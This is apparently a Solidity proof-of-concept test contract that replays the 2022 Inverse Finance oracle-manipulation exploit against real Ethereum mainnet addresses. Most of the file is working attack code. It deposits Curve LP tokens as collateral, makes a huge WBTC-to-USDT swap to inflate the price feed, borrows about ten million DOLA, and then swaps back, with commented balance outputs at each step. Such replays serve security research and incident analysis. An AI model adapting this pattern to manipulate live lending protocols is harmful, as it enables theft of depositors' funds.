// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "ds-test/test.sol";
import "./interface.sol";

// Transaction hash
// 0x958236266991bc3fe3b77feaacea120f172c0708ad01c7a715b255f218f9313c
// Status
// Success
// Timestamp
// 2022-06-16 08:47:58(UTC)
// Block number
// 14972419

contract InverseFi_attack is DSTest {
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 DOLA = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);
    IERC20 crvcrypto =IERC20(0xc4AD29ba4B3c580e6D59105FFf484999997675Ff);
    IERC20 CRV = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    VyperContract yvCurve3Crypto= VyperContract(0xE537B5cc158EB71037D4125BDD7538421981E6AA);
    CErc20Interface anYvcrvCrypto  = CErc20Interface(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587);


    ICurvePool USDTWBTCWETHPool = ICurvePool(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
    VyperContract curveRegistry = VyperContract(0x8e764bE4288B842791989DB5b8ec067279829809);
    ICurvePool dola3pool3crv = ICurvePool(0xAA5A67c256e27A5d80712c51971408db3370927D);
    ICurvePool curve3pool  = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);

    IUnitroller Unitroller = IUnitroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);
    IAggregator YVcrvCryptoFeed = IAggregator(0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C);

    CErc20Interface InverseFinanceDola = CErc20Interface(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);

    uint256[3] amounts;


    string str1;
    string str2;
    string str3;
    string str4;
    string str5;
    string str6;

    string str89;
    string str90;
    string str91;
    string str92;
    string str93;
    string str94;
    string str95;


    
    constructor() public {
        WBTC.approve(address(USDTWBTCWETHPool),type(uint256).max);
        WBTC.approve(address(curveRegistry),type(uint256).max);
        usdt.approve(address(curveRegistry),type(uint256).max); 
        DOLA.approve(address(curveRegistry),type(uint256).max); 
        crvcrypto.approve(0xE537B5cc158EB71037D4125BDD7538421981E6AA,type(uint256).max);
        yvCurve3Crypto.approve(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587,type(uint256).max);
        // allow to borrow from crvcrypto
        address[] memory toEnter = new address[](1);
        toEnter[0] = 0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587 ;
        Unitroller.enterMarkets(toEnter);
    }



    // ================== flash loan of 27000 WBTC ==========================    
    function attack() public {
        // action 1: AddLiquidity WBTC -> CRVCrypto   State:USDTWBTCWETHPool
        //           State: USDTWBTCWETHPool
        // str1 = USDTWBTCWETHPoolSummary();
        // str2 = crvcryptoSummary();
        // uint crvcryptoGot = crvcrypto.balanceOf(address(this));

        amounts = [0, 225 * 1e8, 0];
        USDTWBTCWETHPool.add_liquidity(amounts,0); 

        // crvcryptoGot = (crvcrypto.balanceOf(address(this)) -  crvcryptoGot) / 1e18;
        // str3 = USDTWBTCWETHPoolSummary();
        // str4 = crvcryptoSummary();
        // revert( appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(str3, appendWithSpace(str4, uint2str(crvcryptoGot)))) );


        // USDT Liquidity: 87636422 WBTC Liquidity: 4042 
        // totalSupply: 294784 
        // USDT Liquidity: 87636422 WBTC Liquidity: 4267 
        // totalSupply: 300160 
        // 5375




        // action 2: Deposit    CRVCrypto -> yvCurve3Crypto(shares)    State: yvCurve3Crypto
        //                      State: yvCurve3Crypto
        // str1 = yvCurve3CryptoSummary();
        // uint yvCurve3CryptoGot = yvCurve3Crypto.balanceOf(address(this));

        yvCurve3Crypto.deposit(5375 * 1e18,address(this));

        // yvCurve3CryptoGot = ( yvCurve3Crypto.balanceOf(address(this)) - yvCurve3CryptoGot) / 1e18;
        // str2 = yvCurve3CryptoSummary();
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(yvCurve3CryptoGot))));

        // totalSupply: 3186 crvcryptoBalance: 88 
        // totalSupply: 8092 crvcryptoBalance: 5463 
        // 4906



        // action 3: Mint     yvCurve3Crypto ->  LQ    State: anYvcrvCrypto, including anYvcrvCrypto(accountTokens
        //                    State: anYvcrvCrypto
        // str1 = USDTWBTCWETHPoolSummary();
        // (,uint LQinit,) = Unitroller.getAccountLiquidity(address(this));

        anYvcrvCrypto.mint(4906 * 1e18);

        // (,uint LQafter,) = Unitroller.getAccountLiquidity(address(this));
        // uint LQGot = (LQafter - LQinit) / 1e18;
        // str2 = USDTWBTCWETHPoolSummary();
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(LQGot))));

        // USDT Liquidity: 87636422 WBTC Liquidity: 4267 
        // USDT Liquidity: 87636422 WBTC Liquidity: 4267 
        // 3846081


        // uint anYvcrvCryptoGot = anYvcrvCrypto.balanceOf(address(this));
        // anYvcrvCryptoGot = ( anYvcrvCrypto.balanceOf(address(this)) - anYvcrvCryptoGot) / 1e8;


        // anYvcrvCrypto of users  + USDT Liquidity  +  WBTC Liquidity  ====> LQ got





        // action 4 ExchangeWBTC2USDT:   WBTC -> USDT  State: USDTWBTCWETHPool
        //                              State: USDTWBTCWETHPool

        // str1 = USDTWBTCWETHPoolSummaryWithLQ();
        // uint USDTGot = usdt.balanceOf(address(this));
        
        curveRegistry.exchange(address(USDTWBTCWETHPool),address(WBTC),address(usdt), 26775 * 1e8 , 0, address(this));

        // USDTGot = (usdt.balanceOf(address(this)) - USDTGot) / 1e6;
        // str2 = USDTWBTCWETHPoolSummaryWithLQ();
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(USDTGot))));

        // USDT Liquidity: 87636422 WBTC Liquidity: 4267 LQ of address(this): 3846081 
        // USDT Liquidity: 12233046 WBTC Liquidity: 31042 LQ of address(this): 11113114 
        // 75403376



        // action 5 Borrow:   LQ --> Dola  State: InverseFinanceDola
        //                         State: InverseFinanceDola

        // (,uint LQint,) = Unitroller.getAccountLiquidity(address(this));
        // uint DolaGot = DOLA.balanceOf(address(this));

        InverseFinanceDola.borrow(10133949 * 1e18);  // use yvcrvCrypto (anYvcrvCrypto) as collateral 

        // (,uint LQafter,) = Unitroller.getAccountLiquidity(address(this));
        // uint LQCost = (LQint - LQafter) / 1e18;
        // DolaGot = (DOLA.balanceOf(address(this)) - DolaGot) / 1e18;
        // revert(appendWithSpace(uint2str(DolaGot), uint2str(LQCost)));

        // 10133949 10133949


        // uint oraclePrice = uint(YVcrvCryptoFeed.latestAnswer()) / 1e18;
        // revert(uint2str(oraclePrice));
        // 2831

        

        // action 6 ExchangeUSDT2WBTC:   USDT -> WBTC  State: USDTWBTCWETHPool
        //                              State: USDTWBTCWETHPool
        // str1 = USDTWBTCWETHPoolSummary();
        // uint WBTCGot = WBTC.balanceOf(address(this));

        curveRegistry.exchange(address(USDTWBTCWETHPool),address(usdt),address(WBTC),75403376 * 1e6,0,address(this));
        
        // WBTCGot = (WBTC.balanceOf(address(this)) - WBTCGot) / 1e8;
        // str2 = USDTWBTCWETHPoolSummary();
        // revert(appendWithSpace(str1, appendWithSpace(str2, uint2str(WBTCGot))));

        // USDT Liquidity: 12233046 WBTC Liquidity: 31042
        // USDT Liquidity: 87636422 WBTC Liquidity: 4415 
        // 26626


        
        revert(ProfitSummary());
        // WBTC Balance: 26626 Dola Balance: 10133949
  }
  
    receive() payable external{}

    function CurveBalanceSummary() internal returns (string memory _uintAsString){
        uint balance1 = curve3pool.balances(0) / 10 ** 18; // DAI
        uint balance2 = curve3pool.balances(1) / 10 ** 6; // USDC
        uint balance3 = curve3pool.balances(2) / 10 ** 6; // USDT
        str89 = append("DAI liquidity: ", uint2str(balance1));
        str90 = append(" USDC liquidity: ", uint2str(balance2));
        str91 = append(" USDT liquidity: ", uint2str(balance3));
        return append(append(str89, str90), str91);
    }


    function yvCurve3CryptoSummary() public returns (string memory) {
        uint totalSupply = yvCurve3Crypto.totalSupply() / 1e18;   
        uint crvcryptoBalance = crvcrypto.balanceOf(address(yvCurve3Crypto)) / 1e18;
        str89 = append("totalSupply: ", uint2str(totalSupply));   
        str90 = append("crvcryptoBalance: ", uint2str(crvcryptoBalance));
        return appendWithSpace(str89, str90);
    }
    

    function dola3pool3crvSummary() public returns (string memory) {
        uint DolaBalance = dola3pool3crv.balances(0) / 1e18;
        uint CRVBalance = dola3pool3crv.balances(1) / 1e18;
        str89 = append("DolaBalance: ", uint2str(DolaBalance));
        str90 = append("CRVBalance: ", uint2str(CRVBalance));
        return appendWithSpace(str89, str90);
    }


    function USDTWBTCWETHPoolSummaryWithLQ() public returns (string memory) {
        uint USDTLiquidity = USDTWBTCWETHPool.balances(0) / 1e6;
        uint WBTCLiquidity = USDTWBTCWETHPool.balances(1) / 1e8;
        (,uint LQint,) = Unitroller.getAccountLiquidity(address(this));
        str89 = append("USDT Liquidity: ", uint2str(USDTLiquidity));
        str90 = append("WBTC Liquidity: ", uint2str(WBTCLiquidity));
        str91 = append("LQ of address(this): ", uint2str(LQint / 1e18));
        return appendWithSpace(str89, appendWithSpace(str90, str91));
    }


    function USDTWBTCWETHPoolSummary() public returns (string memory) {
        uint USDTLiquidity = USDTWBTCWETHPool.balances(0) / 1e6;
        uint WBTCLiquidity = USDTWBTCWETHPool.balances(1) / 1e8;
         (,uint LQint,) = Unitroller.getAccountLiquidity(address(this));
        str89 = append("USDT Liquidity: ", uint2str(USDTLiquidity));
        str90 = append("WBTC Liquidity: ", uint2str(WBTCLiquidity));
        return appendWithSpace(str89, str90);
    }


    function crvcryptoSummary() public returns (string memory) {
        uint totalSupply = crvcrypto.totalSupply() / 1e18;   
        return append("totalSupply: ", uint2str(totalSupply));   
    }


    function ProfitSummary() public returns (string memory) {
        uint WBTCBalance = WBTC.balanceOf(address(this))/1e8;
        uint DolaBalance = DOLA.balanceOf(address(this))/1e18;
        uint USDTBalance = usdt.balanceOf(address(this))/1e6;
        
        str1 = append("WBTC Balance: ", uint2str(WBTCBalance));
        str2 = append("Dola Balance: ", uint2str(DolaBalance));
        str3 = append("USDT Balance: ", uint2str(USDTBalance));
        return appendWithSpace(str1, appendWithSpace(str2, str3));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }

}




